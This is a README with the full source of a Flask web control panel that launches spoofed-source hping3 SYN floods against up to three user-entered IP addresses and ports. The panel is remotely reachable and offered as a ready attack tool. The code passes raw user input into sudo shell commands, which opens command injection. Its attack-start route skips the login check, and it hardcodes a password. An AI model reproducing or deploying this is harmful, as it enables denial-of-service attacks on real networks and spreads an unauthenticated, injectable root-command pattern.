# ddos-use-kali-linux-on-wed-remote-access
# Flask DDoS Attack Control

This project provides a simple web interface to control a DDoS attack using `hping3` via a Flask application. Users can log in and start or stop an attack by specifying IP addresses, ports, and the duration of the attack.

## Prerequisites

Before running the project, ensure the following are installed on your machine:

- Python 3.x
- Flask (`pip install flask`)
- hping3 (needs to be run with root access)
- Multiprocessing and threading modules (which come with Python)

## Installation

1. Clone this repository to your local machine:

    ```bash
    
    ```

2. Install the required Python libraries:

    ```bash
    pip install -r requirements.txt
    ```

3. Make sure `hping3` is installed on your system:

    - On Ubuntu/Debian:

      ```bash
      sudo apt install hping3
      ```

4. Start the Flask application:

    ```bash
    python app.py
    ```

5. Open a browser and navigate to `http://localhost:5000` to access the control panel.

## Login

When you first visit the page, you will be prompted to log in with a password. The default password is:


## Using the Application

Once logged in, you can:

- Enter IP addresses and ports for three targets.
- Specify the duration of the attack in seconds.
- Start and stop the attack via the web interface.

## Code Structure

Here is the code for the Flask application that handles the backend functionality:

```python
from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import subprocess
import threading
import time
import os
import multiprocessing

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Each time the server starts, a new session key is generated

# HTML template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Control</title>
    <script>
        function startAttack() {
            const ip1 = document.getElementById('ip1').value;
            const port1 = document.getElementById('port1').value;
            const ip2 = document.getElementById('ip2').value;
            const port2 = document.getElementById('port2').value;
            const ip3 = document.getElementById('ip3').value;
            const port3 = document.getElementById('port3').value;
            const duration = document.getElementById('duration').value;

            // Create JSON object with data
            const data = {
                ip1: ip1,
                port1: port1,
                ip2: ip2,
                port2: port2,
                ip3: ip3,
                port3: port3,
                duration: duration
            };

            fetch('/start_attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                alert('Error: ' + error);
            });
        }

        function stopAttack() {
            fetch('/stop_attack', {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                alert('Error: ' + error);
            });
        }
    </script>
</head>
<body>
    <h1>Start DDoS Attack</h1>
    <label for="ip1">IP1:</label>
    <input type="text" id="ip1" placeholder="Enter IP Address">
    <br><br>
    <label for="port1">Port1:</label>
    <input type="number" id="port1" placeholder="Enter Port">
    <br><br>

    <label for="ip2">IP2:</label>
    <input type="text" id="ip2" placeholder="Enter IP Address">
    <br><br>
    <label for="port2">Port2:</label>
    <input type="number" id="port2" placeholder="Enter Port">
    <br><br>

    <label for="ip3">IP3:</label>
    <input type="text" id="ip3" placeholder="Enter IP Address">
    <br><br>
    <label for="port3">Port3:</label>
    <input type="number" id="port3" placeholder="Enter Port">
    <br><br>

    <label for="duration">Duration (seconds):</label>
    <input type="number" id="duration" placeholder="Duration">
    <br><br>

    <button onclick="startAttack()">Start Attack</button>
    <button onclick="stopAttack()">Stop Attack</button>
</body>
</html>
'''

# HTML login template
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <form action="/login" method="POST">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br><br>
        <button type="submit">Log In</button>
    </form>
</body>
</html>
'''

# Define your password here
PASSWORD = "jrd772zac"

# HTML login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == PASSWORD:
            session['logged_in'] = True  # Set the session to logged in
            return redirect(url_for('index'))
        else:
            return "Incorrect password", 403
    return render_template_string(LOGIN_TEMPLATE)

# Function to run the hping3 attack with all CPU cores
def start_attack(ip, port, duration):
    cpu_cores = multiprocessing.cpu_count()
    for _ in range(cpu_cores):
        command = f"sudo hping3 --flood --rand-source -S -p {port} {ip} &"
        subprocess.run(command, shell=True, executable="/bin/bash")

    if duration > 0:
        time.sleep(duration)
        stop_attack_command = "sudo killall hping3"
        subprocess.run(stop_attack_command, shell=True, executable="/bin/bash")

@app.route('/')
def index():
    if not session.get('logged_in'):  # Check if the user is logged in
        return redirect(url_for('login'))  # If not, redirect to login page
    return render_template_string(HTML_TEMPLATE)

@app.route('/start_attack', methods=['POST'])
def start_attack_route():
    data = request.json
    ip1 = data.get('ip1')
    port1 = data.get('port1')
    ip2 = data.get('ip2')
    port2 = data.get('port2')
    ip3 = data.get('ip3')
    port3 = data.get('port3')
    duration = int(data.get('duration', 0))

    if not ip1 or not port1:
        return jsonify({"status": "error", "message": "IP and port 1 must be provided!"}), 400

    if ip1 and port1:
        threading.Thread(target=start_attack, args=(ip1, port1, duration)).start()
    if ip2 and port2:
        threading.Thread(target=start_attack, args=(ip2, port2, duration)).start()
    if ip3 and port3:
        threading.Thread(target=start_attack, args=(ip3, port3, duration)).start()

    return jsonify({"status": "success", "message": "Attack started!"})

@app.route('/stop_attack', methods=['POST'])
def stop_attack_route():
    stop_attack_command = "sudo killall hping3"
    subprocess.run(stop_attack_command, shell=True, executable="/bin/bash")
    return jsonify({"status": "success", "message": "Attack stopped!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
